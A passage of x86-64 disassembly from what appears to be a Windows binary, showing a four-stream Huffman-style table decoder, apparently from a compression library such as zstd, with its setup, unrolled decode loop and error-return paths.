   140001e53:	0f 82 0c ff ff ff    	jb     0x140001d65
   140001e59:	48 89 fa             	mov    %rdi,%rdx
   140001e5c:	83 f8 40             	cmp    $0x40,%eax
   140001e5f:	0f 85 35 ff ff ff    	jne    0x140001d9a
   140001e65:	e9 37 ff ff ff       	jmp    0x140001da1
   140001e6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001e70:	48 c7 c2 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rdx
   140001e77:	48 89 d0             	mov    %rdx,%rax
   140001e7a:	5b                   	pop    %rbx
   140001e7b:	5e                   	pop    %rsi
   140001e7c:	5f                   	pop    %rdi
   140001e7d:	5d                   	pop    %rbp
   140001e7e:	41 5c                	pop    %r12
   140001e80:	41 5d                	pop    %r13
   140001e82:	41 5e                	pop    %r14
   140001e84:	c3                   	ret
   140001e85:	4c 89 ca             	mov    %r9,%rdx
   140001e88:	e9 14 ff ff ff       	jmp    0x140001da1
   140001e8d:	0f 1f 00             	nopl   (%rax)
   140001e90:	41 57                	push   %r15
   140001e92:	41 56                	push   %r14
   140001e94:	41 55                	push   %r13
   140001e96:	41 54                	push   %r12
   140001e98:	55                   	push   %rbp
   140001e99:	57                   	push   %rdi
   140001e9a:	56                   	push   %rsi
   140001e9b:	53                   	push   %rbx
   140001e9c:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   140001ea3:	48 89 94 24 f8 00 00 	mov    %rdx,0xf8(%rsp)
   140001eaa:	00 
   140001eab:	48 89 c8             	mov    %rcx,%rax
   140001eae:	48 c7 c2 ec ff ff ff 	mov    $0xffffffffffffffec,%rdx
   140001eb5:	49 83 f9 09          	cmp    $0x9,%r9
   140001eb9:	76 34                	jbe    0x140001eef
   140001ebb:	41 0f b7 38          	movzwl (%r8),%edi
   140001ebf:	41 0f b7 70 02       	movzwl 0x2(%r8),%esi
   140001ec4:	4c 89 c9             	mov    %r9,%rcx
   140001ec7:	45 0f b7 58 04       	movzwl 0x4(%r8),%r11d
   140001ecc:	48 8d 14 37          	lea    (%rdi,%rsi,1),%rdx
   140001ed0:	49 89 fc             	mov    %rdi,%r12
   140001ed3:	48 89 f5             	mov    %rsi,%rbp
   140001ed6:	48 29 d1             	sub    %rdx,%rcx
   140001ed9:	4c 89 db             	mov    %r11,%rbx
   140001edc:	4c 29 d9             	sub    %r11,%rcx
   140001edf:	48 8d 51 fa          	lea    -0x6(%rcx),%rdx
   140001ee3:	49 39 d1             	cmp    %rdx,%r9
   140001ee6:	73 28                	jae    0x140001f10
   140001ee8:	48 c7 c2 ec ff ff ff 	mov    $0xffffffffffffffec,%rdx
   140001eef:	48 89 d0             	mov    %rdx,%rax
   140001ef2:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   140001ef9:	5b                   	pop    %rbx
   140001efa:	5e                   	pop    %rsi
   140001efb:	5f                   	pop    %rdi
   140001efc:	5d                   	pop    %rbp
   140001efd:	41 5c                	pop    %r12
   140001eff:	41 5d                	pop    %r13
   140001f01:	41 5e                	pop    %r14
   140001f03:	41 5f                	pop    %r15
   140001f05:	c3                   	ret
   140001f06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001f0d:	00 00 00 
   140001f10:	48 85 ff             	test   %rdi,%rdi
   140001f13:	0f 84 a7 05 00 00    	je     0x1400024c0
   140001f19:	4d 8d 70 06          	lea    0x6(%r8),%r14
   140001f1d:	45 0f b6 4c 38 05    	movzbl 0x5(%r8,%rdi,1),%r9d
   140001f23:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001f28:	48 83 ff 07          	cmp    $0x7,%rdi
   140001f2c:	0f 86 ee 04 00 00    	jbe    0x140002420
   140001f32:	4d 8d 54 3e f8       	lea    -0x8(%r14,%rdi,1),%r10
   140001f37:	4c 89 54 24 08       	mov    %r10,0x8(%rsp)
   140001f3c:	45 84 c9             	test   %r9b,%r9b
   140001f3f:	0f 84 43 06 00 00    	je     0x140002588
   140001f45:	45 0f bd c9          	bsr    %r9d,%r9d
   140001f49:	41 bd 08 00 00 00    	mov    $0x8,%r13d
   140001f4f:	4d 8b 12             	mov    (%r10),%r10
   140001f52:	45 29 cd             	sub    %r9d,%r13d
   140001f55:	48 85 f6             	test   %rsi,%rsi
   140001f58:	0f 84 62 05 00 00    	je     0x1400024c0
   140001f5e:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140001f63:	4c 01 f7             	add    %r14,%rdi
   140001f66:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140001f6b:	44 0f b6 4c 37 ff    	movzbl -0x1(%rdi,%rsi,1),%r9d
   140001f71:	48 83 fe 07          	cmp    $0x7,%rsi
   140001f75:	0f 86 55 05 00 00    	jbe    0x1400024d0
   140001f7b:	48 8d 7c 37 f8       	lea    -0x8(%rdi,%rsi,1),%rdi
   140001f80:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001f85:	45 84 c9             	test   %r9b,%r9b
   140001f88:	0f 84 fa 05 00 00    	je     0x140002588
   140001f8e:	45 0f bd c9          	bsr    %r9d,%r9d
   140001f92:	41 bf 08 00 00 00    	mov    $0x8,%r15d
   140001f98:	48 8b 3f             	mov    (%rdi),%rdi
   140001f9b:	45 29 cf             	sub    %r9d,%r15d
   140001f9e:	4d 85 db             	test   %r11,%r11
   140001fa1:	0f 84 19 05 00 00    	je     0x1400024c0
   140001fa7:	4c 8b 74 24 10       	mov    0x10(%rsp),%r14
   140001fac:	4c 01 f6             	add    %r14,%rsi
   140001faf:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140001fb4:	46 0f b6 4c 1e ff    	movzbl -0x1(%rsi,%r11,1),%r9d
   140001fba:	49 83 fb 07          	cmp    $0x7,%r11
   140001fbe:	0f 86 d4 05 00 00    	jbe    0x140002598
   140001fc4:	4a 8d 5c 1e f8       	lea    -0x8(%rsi,%r11,1),%rbx
   140001fc9:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001fce:	45 84 c9             	test   %r9b,%r9b
   140001fd1:	0f 84 b1 05 00 00    	je     0x140002588
   140001fd7:	48 8b 2b             	mov    (%rbx),%rbp
   140001fda:	45 0f bd c9          	bsr    %r9d,%r9d
   140001fde:	bb 08 00 00 00       	mov    $0x8,%ebx
   140001fe3:	44 29 cb             	sub    %r9d,%ebx
   140001fe6:	89 5c 24 70          	mov    %ebx,0x70(%rsp)
   140001fea:	48 85 d2             	test   %rdx,%rdx
   140001fed:	0f 84 cd 04 00 00    	je     0x1400024c0
   140001ff3:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001ff8:	4c 01 db             	add    %r11,%rbx
   140001ffb:	48 8d 73 08          	lea    0x8(%rbx),%rsi
   140001fff:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
   140002006:	00 
   140002007:	44 0f b6 4c 0b f9    	movzbl -0x7(%rbx,%rcx,1),%r9d
   14000200d:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140002012:	48 83 fa 07          	cmp    $0x7,%rdx
   140002016:	0f 86 04 0d 00 00    	jbe    0x140002d20
   14000201c:	45 84 c9             	test   %r9b,%r9b
   14000201f:	0f 84 63 05 00 00    	je     0x140002588
   140002025:	45 0f bd d9          	bsr    %r9d,%r11d
   140002029:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   14000202f:	45 29 d9             	sub    %r11d,%r9d
   140002032:	48 83 fa 88          	cmp    $0xffffffffffffff88,%rdx
   140002036:	0f 87 b3 fe ff ff    	ja     0x140001eef
   14000203c:	48 8d 5c 0b f2       	lea    -0xe(%rbx,%rcx,1),%rbx
   140002041:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140002046:	4c 8b 23             	mov    (%rbx),%r12
   140002049:	48 8b b4 24 10 01 00 	mov    0x110(%rsp),%rsi
   140002050:	00 
   140002051:	48 8b 9c 24 f8 00 00 	mov    0xf8(%rsp),%rbx
   140002058:	00 
   140002059:	48 8d 56 04          	lea    0x4(%rsi),%rdx
   14000205d:	48 8b b4 24 f8 00 00 	mov    0xf8(%rsp),%rsi
   140002064:	00 
   140002065:	48 01 c3             	add    %rax,%rbx
   140002068:	48 89 9c 24 98 00 00 	mov    %rbx,0x98(%rsp)
   14000206f:	00 
   140002070:	48 83 eb 03          	sub    $0x3,%rbx
   140002074:	48 8d 4e 03          	lea    0x3(%rsi),%rcx
   140002078:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
   14000207d:	48 c1 e9 02          	shr    $0x2,%rcx
   140002081:	48 8d 34 08          	lea    (%rax,%rcx,1),%rsi
   140002085:	48 89 74 24 78       	mov    %rsi,0x78(%rsp)
   14000208a:	48 01 ce             	add    %rcx,%rsi
   14000208d:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   140002094:	00 
   140002095:	48 01 ce             	add    %rcx,%rsi
   140002098:	48 8b 8c 24 10 01 00 	mov    0x110(%rsp),%rcx
   14000209f:	00 
   1400020a0:	48 89 b4 24 90 00 00 	mov    %rsi,0x90(%rsp)
   1400020a7:	00 
   1400020a8:	0f b6 49 02          	movzbl 0x2(%rcx),%ecx
   1400020ac:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   1400020b0:	49 8d 48 0e          	lea    0xe(%r8),%rcx
   1400020b4:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   1400020b9:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400020be:	48 83 c1 08          	add    $0x8,%rcx
   1400020c2:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   1400020c7:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400020cc:	48 83 c1 08          	add    $0x8,%rcx
   1400020d0:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   1400020d5:	48 39 de             	cmp    %rbx,%rsi
   1400020d8:	0f 83 a8 0d 00 00    	jae    0x140002e86
   1400020de:	44 8b 44 24 74       	mov    0x74(%rsp),%r8d
   1400020e3:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400020e8:	49 89 f3             	mov    %rsi,%r11
   1400020eb:	4d 89 e6             	mov    %r12,%r14
   1400020ee:	48 8b b4 24 88 00 00 	mov    0x88(%rsp),%rsi
   1400020f5:	00 
   1400020f6:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   1400020fb:	48 89 2c 24          	mov    %rbp,(%rsp)
   1400020ff:	41 f7 d8             	neg    %r8d
   140002102:	8b 7c 24 70          	mov    0x70(%rsp),%edi
   140002106:	41 83 e0 3f          	and    $0x3f,%r8d
   14000210a:	e9 b1 00 00 00       	jmp    0x1400021c0
   14000210f:	90                   	nop
   140002110:	44 89 e9             	mov    %r13d,%ecx
   140002113:	41 83 e5 07          	and    $0x7,%r13d
   140002117:	c1 e9 03             	shr    $0x3,%ecx
   14000211a:	48 29 cd             	sub    %rcx,%rbp
   14000211d:	31 c9                	xor    %ecx,%ecx
   14000211f:	48 89 6c 24 08       	mov    %rbp,0x8(%rsp)
   140002124:	4c 8b 55 00          	mov    0x0(%rbp),%r10
   140002128:	4c 8b 64 24 28       	mov    0x28(%rsp),%r12
   14000212d:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140002132:	49 39 ec             	cmp    %rbp,%r12
   140002135:	0f 82 c5 0b 00 00    	jb     0x140002d00
   14000213b:	44 89 fd             	mov    %r15d,%ebp
   14000213e:	41 83 e7 07          	and    $0x7,%r15d
   140002142:	c1 ed 03             	shr    $0x3,%ebp
   140002145:	49 29 ec             	sub    %rbp,%r12
   140002148:	49 8b 2c 24          	mov    (%r12),%rbp
   14000214c:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   140002151:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002156:	4c 8b 64 24 30       	mov    0x30(%rsp),%r12
   14000215b:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002160:	49 39 ec             	cmp    %rbp,%r12
   140002163:	0f 82 a7 0b 00 00    	jb     0x140002d10
   140002169:	89 fd                	mov    %edi,%ebp
   14000216b:	83 e7 07             	and    $0x7,%edi
   14000216e:	c1 ed 03             	shr    $0x3,%ebp
   140002171:	49 29 ec             	sub    %rbp,%r12
   140002174:	49 8b 2c 24          	mov    (%r12),%rbp
   140002178:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   14000217d:	48 89 2c 24          	mov    %rbp,(%rsp)
   140002181:	4c 8b 64 24 38       	mov    0x38(%rsp),%r12
   140002186:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   14000218b:	49 39 ec             	cmp    %rbp,%r12
   14000218e:	0f 82 ac 04 00 00    	jb     0x140002640
   140002194:	44 89 cd             	mov    %r9d,%ebp
   140002197:	41 83 e1 07          	and    $0x7,%r9d
   14000219b:	c1 ed 03             	shr    $0x3,%ebp
   14000219e:	49 29 ec             	sub    %rbp,%r12
   1400021a1:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1400021a6:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   1400021ab:	4d 8b 34 24          	mov    (%r12),%r14
   1400021af:	49 39 eb             	cmp    %rbp,%r11
   1400021b2:	0f 83 88 04 00 00    	jae    0x140002640
   1400021b8:	85 c9                	test   %ecx,%ecx
   1400021ba:	0f 85 80 04 00 00    	jne    0x140002640
   1400021c0:	44 89 e9             	mov    %r13d,%ecx
   1400021c3:	4c 89 d5             	mov    %r10,%rbp
   1400021c6:	4c 8b 24 24          	mov    (%rsp),%r12
   1400021ca:	48 d3 e5             	shl    %cl,%rbp
   1400021cd:	44 89 c1             	mov    %r8d,%ecx
   1400021d0:	48 d3 ed             	shr    %cl,%rbp
   1400021d3:	48 8d 2c 6a          	lea    (%rdx,%rbp,2),%rbp
   1400021d7:	0f b6 4d 00          	movzbl 0x0(%rbp),%ecx
   1400021db:	0f b6 6d 01          	movzbl 0x1(%rbp),%ebp
   1400021df:	44 01 ed             	add    %r13d,%ebp
   1400021e2:	88 08                	mov    %cl,(%rax)
   1400021e4:	44 89 f9             	mov    %r15d,%ecx
   1400021e7:	89 6c 24 70          	mov    %ebp,0x70(%rsp)
   1400021eb:	48 8b 6c 24 18       	mov    0x18(%rsp),%rbp
   1400021f0:	48 d3 e5             	shl    %cl,%rbp
   1400021f3:	44 89 c1             	mov    %r8d,%ecx
   1400021f6:	48 d3 ed             	shr    %cl,%rbp
   1400021f9:	48 8d 2c 6a          	lea    (%rdx,%rbp,2),%rbp
   1400021fd:	0f b6 4d 00          	movzbl 0x0(%rbp),%ecx
   140002201:	0f b6 6d 01          	movzbl 0x1(%rbp),%ebp
   140002205:	88 0b                	mov    %cl,(%rbx)
   140002207:	89 f9                	mov    %edi,%ecx
   140002209:	44 01 fd             	add    %r15d,%ebp
   14000220c:	44 8b 7c 24 70       	mov    0x70(%rsp),%r15d
   140002211:	49 d3 e4             	shl    %cl,%r12
   140002214:	44 89 c1             	mov    %r8d,%ecx
   140002217:	49 d3 ec             	shr    %cl,%r12
   14000221a:	4e 8d 24 62          	lea    (%rdx,%r12,2),%r12
   14000221e:	41 0f b6 0c 24       	movzbl (%r12),%ecx
   140002223:	45 0f b6 6c 24 01    	movzbl 0x1(%r12),%r13d
   140002229:	88 0e                	mov    %cl,(%rsi)
   14000222b:	41 01 fd             	add    %edi,%r13d
   14000222e:	44 89 c9             	mov    %r9d,%ecx
   140002231:	4c 89 f7             	mov    %r14,%rdi
   140002234:	48 d3 e7             	shl    %cl,%rdi
   140002237:	44 89 c1             	mov    %r8d,%ecx
   14000223a:	48 d3 ef             	shr    %cl,%rdi
   14000223d:	48 8d 3c 7a          	lea    (%rdx,%rdi,2),%rdi
   140002241:	0f b6 0f             	movzbl (%rdi),%ecx
   140002244:	44 0f b6 67 01       	movzbl 0x1(%rdi),%r12d
   140002249:	41 88 0b             	mov    %cl,(%r11)
   14000224c:	45 01 cc             	add    %r9d,%r12d
   14000224f:	44 89 f9             	mov    %r15d,%ecx
   140002252:	4d 89 d1             	mov    %r10,%r9
   140002255:	49 d3 e1             	shl    %cl,%r9
   140002258:	44 89 c1             	mov    %r8d,%ecx
   14000225b:	49 d3 e9             	shr    %cl,%r9
   14000225e:	4e 8d 0c 4a          	lea    (%rdx,%r9,2),%r9
   140002262:	41 0f b6 79 01       	movzbl 0x1(%r9),%edi
   140002267:	41 0f b6 09          	movzbl (%r9),%ecx
   14000226b:	44 01 ff             	add    %r15d,%edi
   14000226e:	4c 8b 7c 24 18       	mov    0x18(%rsp),%r15
   140002273:	88 48 01             	mov    %cl,0x1(%rax)
   140002276:	89 e9                	mov    %ebp,%ecx
   140002278:	4d 89 f9             	mov    %r15,%r9
   14000227b:	49 d3 e1             	shl    %cl,%r9
   14000227e:	44 89 c1             	mov    %r8d,%ecx
   140002281:	49 d3 e9             	shr    %cl,%r9
   140002284:	4e 8d 0c 4a          	lea    (%rdx,%r9,2),%r9
   140002288:	41 0f b6 09          	movzbl (%r9),%ecx
   14000228c:	45 0f b6 49 01       	movzbl 0x1(%r9),%r9d
   140002291:	41 01 e9             	add    %ebp,%r9d
   140002294:	48 8b 2c 24          	mov    (%rsp),%rbp
   140002298:	88 4b 01             	mov    %cl,0x1(%rbx)
   14000229b:	44 89 e9             	mov    %r13d,%ecx
   14000229e:	48 d3 e5             	shl    %cl,%rbp
   1400022a1:	44 89 c1             	mov    %r8d,%ecx
   1400022a4:	48 d3 ed             	shr    %cl,%rbp
   1400022a7:	48 8d 2c 6a          	lea    (%rdx,%rbp,2),%rbp
   1400022ab:	0f b6 4d 00          	movzbl 0x0(%rbp),%ecx
   1400022af:	0f b6 6d 01          	movzbl 0x1(%rbp),%ebp
   1400022b3:	88 4e 01             	mov    %cl,0x1(%rsi)
   1400022b6:	44 01 ed             	add    %r13d,%ebp
   1400022b9:	44 89 e1             	mov    %r12d,%ecx
   1400022bc:	4d 89 f5             	mov    %r14,%r13
   1400022bf:	49 d3 e5             	shl    %cl,%r13
   1400022c2:	44 89 c1             	mov    %r8d,%ecx
   1400022c5:	49 d3 ed             	shr    %cl,%r13
   1400022c8:	4e 8d 2c 6a          	lea    (%rdx,%r13,2),%r13
   1400022cc:	41 0f b6 4d 00       	movzbl 0x0(%r13),%ecx
   1400022d1:	45 0f b6 6d 01       	movzbl 0x1(%r13),%r13d
   1400022d6:	41 88 4b 01          	mov    %cl,0x1(%r11)
   1400022da:	45 01 e5             	add    %r12d,%r13d
   1400022dd:	89 f9                	mov    %edi,%ecx
   1400022df:	4d 89 d4             	mov    %r10,%r12
   1400022e2:	49 d3 e4             	shl    %cl,%r12
   1400022e5:	44 89 c1             	mov    %r8d,%ecx
   1400022e8:	49 d3 ec             	shr    %cl,%r12
   1400022eb:	4e 8d 24 62          	lea    (%rdx,%r12,2),%r12
   1400022ef:	41 0f b6 0c 24       	movzbl (%r12),%ecx
   1400022f4:	45 0f b6 64 24 01    	movzbl 0x1(%r12),%r12d
   1400022fa:	88 48 02             	mov    %cl,0x2(%rax)
   1400022fd:	41 01 fc             	add    %edi,%r12d
   140002300:	44 89 c9             	mov    %r9d,%ecx
   140002303:	4c 89 ff             	mov    %r15,%rdi
   140002306:	48 d3 e7             	shl    %cl,%rdi
   140002309:	44 89 c1             	mov    %r8d,%ecx
   14000230c:	48 d3 ef             	shr    %cl,%rdi
   14000230f:	48 8d 3c 7a          	lea    (%rdx,%rdi,2),%rdi
   140002313:	0f b6 0f             	movzbl (%rdi),%ecx
   140002316:	0f b6 7f 01          	movzbl 0x1(%rdi),%edi
   14000231a:	44 01 cf             	add    %r9d,%edi
   14000231d:	4c 8b 0c 24          	mov    (%rsp),%r9
   140002321:	88 4b 02             	mov    %cl,0x2(%rbx)
   140002324:	89 e9                	mov    %ebp,%ecx
   140002326:	49 d3 e1             	shl    %cl,%r9
   140002329:	44 89 c1             	mov    %r8d,%ecx
   14000232c:	49 d3 e9             	shr    %cl,%r9
   14000232f:	4e 8d 0c 4a          	lea    (%rdx,%r9,2),%r9
   140002333:	41 0f b6 09          	movzbl (%r9),%ecx
   140002337:	45 0f b6 49 01       	movzbl 0x1(%r9),%r9d
   14000233c:	88 4e 02             	mov    %cl,0x2(%rsi)
   14000233f:	41 01 e9             	add    %ebp,%r9d
   140002342:	44 89 e9             	mov    %r13d,%ecx
   140002345:	4c 89 f5             	mov    %r14,%rbp
   140002348:	48 d3 e5             	shl    %cl,%rbp
   14000234b:	44 89 c1             	mov    %r8d,%ecx
   14000234e:	48 83 c0 04          	add    $0x4,%rax
   140002352:	48 83 c3 04          	add    $0x4,%rbx
   140002356:	48 d3 ed             	shr    %cl,%rbp
   140002359:	48 83 c6 04          	add    $0x4,%rsi
   14000235d:	49 83 c3 04          	add    $0x4,%r11
   140002361:	48 8d 2c 6a          	lea    (%rdx,%rbp,2),%rbp
   140002365:	0f b6 4d 00          	movzbl 0x0(%rbp),%ecx
   140002369:	0f b6 6d 01          	movzbl 0x1(%rbp),%ebp
   14000236d:	41 88 4b fe          	mov    %cl,-0x2(%r11)
   140002371:	44 01 ed             	add    %r13d,%ebp
   140002374:	44 89 e1             	mov    %r12d,%ecx
   140002377:	4d 89 d5             	mov    %r10,%r13
   14000237a:	49 d3 e5             	shl    %cl,%r13
   14000237d:	44 89 c1             	mov    %r8d,%ecx
   140002380:	49 d3 ed             	shr    %cl,%r13
   140002383:	4e 8d 2c 6a          	lea    (%rdx,%r13,2),%r13
   140002387:	41 0f b6 4d 00       	movzbl 0x0(%r13),%ecx
   14000238c:	45 0f b6 6d 01       	movzbl 0x1(%r13),%r13d
   140002391:	88 48 ff             	mov    %cl,-0x1(%rax)
   140002394:	89 f9                	mov    %edi,%ecx
   140002396:	45 01 e5             	add    %r12d,%r13d
   140002399:	49 d3 e7             	shl    %cl,%r15
   14000239c:	44 89 c1             	mov    %r8d,%ecx
   14000239f:	4d 89 fc             	mov    %r15,%r12
   1400023a2:	49 d3 ec             	shr    %cl,%r12
   1400023a5:	4e 8d 24 62          	lea    (%rdx,%r12,2),%r12
   1400023a9:	45 0f b6 7c 24 01    	movzbl 0x1(%r12),%r15d
   1400023af:	41 0f b6 0c 24       	movzbl (%r12),%ecx
   1400023b4:	41 01 ff             	add    %edi,%r15d
   1400023b7:	48 8b 3c 24          	mov    (%rsp),%rdi
   1400023bb:	88 4b ff             	mov    %cl,-0x1(%rbx)
   1400023be:	44 89 c9             	mov    %r9d,%ecx
   1400023c1:	48 d3 e7             	shl    %cl,%rdi
   1400023c4:	44 89 c1             	mov    %r8d,%ecx
   1400023c7:	48 d3 ef             	shr    %cl,%rdi
   1400023ca:	48 8d 3c 7a          	lea    (%rdx,%rdi,2),%rdi
   1400023ce:	0f b6 0f             	movzbl (%rdi),%ecx
   1400023d1:	0f b6 7f 01          	movzbl 0x1(%rdi),%edi
   1400023d5:	88 4e ff             	mov    %cl,-0x1(%rsi)
   1400023d8:	44 01 cf             	add    %r9d,%edi
   1400023db:	89 e9                	mov    %ebp,%ecx
   1400023dd:	4d 89 f1             	mov    %r14,%r9
   1400023e0:	49 d3 e1             	shl    %cl,%r9
   1400023e3:	44 89 c1             	mov    %r8d,%ecx
   1400023e6:	49 d3 e9             	shr    %cl,%r9
   1400023e9:	4e 8d 0c 4a          	lea    (%rdx,%r9,2),%r9
   1400023ed:	41 0f b6 09          	movzbl (%r9),%ecx
   1400023f1:	45 0f b6 49 01       	movzbl 0x1(%r9),%r9d
   1400023f6:	41 88 4b ff          	mov    %cl,-0x1(%r11)
   1400023fa:	41 01 e9             	add    %ebp,%r9d
   1400023fd:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002402:	48 8b 6c 24 08       	mov    0x8(%rsp),%rbp
   140002407:	48 39 cd             	cmp    %rcx,%rbp
   14000240a:	0f 83 00 fd ff ff    	jae    0x140002110
   140002410:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002415:	e9 0e fd ff ff       	jmp    0x140002128
   14000241a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002420:	45 0f b6 50 06       	movzbl 0x6(%r8),%r10d
   140002425:	66 83 ff 07          	cmp    $0x7,%di
   140002429:	77 5d                	ja     0x140002488
   14000242b:	4c 8d 3d 6e fc 01 00 	lea    0x1fc6e(%rip),%r15        # 0x1400220a0
   140002432:	4d 63 2c bf          	movslq (%r15,%rdi,4),%r13
   140002436:	4d 01 fd             	add    %r15,%r13
   140002439:	41 ff e5             	jmp    *%r13
   14000243c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002440:	45 0f b6 68 0c       	movzbl 0xc(%r8),%r13d
   140002445:	49 c1 e5 30          	shl    $0x30,%r13
   140002449:	4d 01 ea             	add    %r13,%r10
   14000244c:	45 0f b6 68 0b       	movzbl 0xb(%r8),%r13d
   140002451:	49 c1 e5 28          	shl    $0x28,%r13
   140002455:	4d 01 ea             	add    %r13,%r10
   140002458:	45 0f b6 68 0a       	movzbl 0xa(%r8),%r13d
   14000245d:	49 c1 e5 20          	shl    $0x20,%r13
   140002461:	4d 01 ea             	add    %r13,%r10
   140002464:	45 0f b6 68 09       	movzbl 0x9(%r8),%r13d
   140002469:	49 c1 e5 18          	shl    $0x18,%r13
   14000246d:	4d 01 ea             	add    %r13,%r10
   140002470:	45 0f b6 68 08       	movzbl 0x8(%r8),%r13d
   140002475:	49 c1 e5 10          	shl    $0x10,%r13
   140002479:	4d 01 ea             	add    %r13,%r10
   14000247c:	45 0f b6 68 07       	movzbl 0x7(%r8),%r13d
   140002481:	49 c1 e5 08          	shl    $0x8,%r13
   140002485:	4d 01 ea             	add    %r13,%r10
   140002488:	45 84 c9             	test   %r9b,%r9b
   14000248b:	0f 84 57 fa ff ff    	je     0x140001ee8
   140002491:	45 0f b7 ec          	movzwl %r12w,%r13d
   140002495:	41 bc 09 00 00 00    	mov    $0x9,%r12d
   14000249b:	45 0f bd c9          	bsr    %r9d,%r9d
   14000249f:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1400024a4:	45 29 ec             	sub    %r13d,%r12d
   1400024a7:	41 c1 e4 03          	shl    $0x3,%r12d
   1400024ab:	4c 89 74 24 08       	mov    %r14,0x8(%rsp)
   1400024b0:	45 89 e5             	mov    %r12d,%r13d
   1400024b3:	45 29 cd             	sub    %r9d,%r13d
   1400024b6:	e9 9a fa ff ff       	jmp    0x140001f55
   1400024bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024c0:	48 c7 c2 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rdx
   1400024c7:	e9 23 fa ff ff       	jmp    0x140001eef
   1400024cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400024d0:	0f b6 3f             	movzbl (%rdi),%edi
   1400024d3:	66 83 fd 07          	cmp    $0x7,%bp
   1400024d7:	77 7d                	ja     0x140002556
   1400024d9:	4c 8d 35 e0 fb 01 00 	lea    0x1fbe0(%rip),%r14        # 0x1400220c0
   1400024e0:	4d 63 24 b6          	movslq (%r14,%rsi,4),%r12
   1400024e4:	4d 01 f4             	add    %r14,%r12
   1400024e7:	41 ff e4             	jmp    *%r12
   1400024ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400024f0:	4c 8b 74 24 10       	mov    0x10(%rsp),%r14
   1400024f5:	45 0f b6 66 06       	movzbl 0x6(%r14),%r12d
   1400024fa:	49 c1 e4 30          	shl    $0x30,%r12
   1400024fe:	4c 01 e7             	add    %r12,%rdi
   140002501:	4c 8b 74 24 10       	mov    0x10(%rsp),%r14
   140002506:	45 0f b6 66 05       	movzbl 0x5(%r14),%r12d
   14000250b:	49 c1 e4 28          	shl    $0x28,%r12
   14000250f:	4c 01 e7             	add    %r12,%rdi
   140002512:	4c 8b 74 24 10       	mov    0x10(%rsp),%r14
   140002517:	45 0f b6 66 04       	movzbl 0x4(%r14),%r12d
   14000251c:	49 c1 e4 20          	shl    $0x20,%r12
   140002520:	4c 01 e7             	add    %r12,%rdi
   140002523:	4c 8b 74 24 10       	mov    0x10(%rsp),%r14
   140002528:	45 0f b6 66 03       	movzbl 0x3(%r14),%r12d
   14000252d:	49 c1 e4 18          	shl    $0x18,%r12
   140002531:	4c 01 e7             	add    %r12,%rdi
   140002534:	4c 8b 74 24 10       	mov    0x10(%rsp),%r14
   140002539:	45 0f b6 66 02       	movzbl 0x2(%r14),%r12d
   14000253e:	49 c1 e4 10          	shl    $0x10,%r12
   140002542:	4c 01 e7             	add    %r12,%rdi
   140002545:	4c 8b 74 24 10       	mov    0x10(%rsp),%r14
   14000254a:	45 0f b6 66 01       	movzbl 0x1(%r14),%r12d
   14000254f:	49 c1 e4 08          	shl    $0x8,%r12
   140002553:	4c 01 e7             	add    %r12,%rdi
   140002556:	45 84 c9             	test   %r9b,%r9b
   140002559:	0f 84 89 f9 ff ff    	je     0x140001ee8
   14000255f:	41 bc 09 00 00 00    	mov    $0x9,%r12d
   140002565:	45 0f bd c9          	bsr    %r9d,%r9d
   140002569:	4c 8b 74 24 10       	mov    0x10(%rsp),%r14
   14000256e:	41 29 ec             	sub    %ebp,%r12d
   140002571:	41 c1 e4 03          	shl    $0x3,%r12d
   140002575:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   14000257a:	45 89 e7             	mov    %r12d,%r15d
   14000257d:	45 29 cf             	sub    %r9d,%r15d
   140002580:	e9 19 fa ff ff       	jmp    0x140001f9e
   140002585:	0f 1f 00             	nopl   (%rax)
   140002588:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   14000258f:	e9 5b f9 ff ff       	jmp    0x140001eef
   140002594:	0f 1f 40 00          	nopl   0x0(%rax)
   140002598:	0f b6 2e             	movzbl (%rsi),%ebp
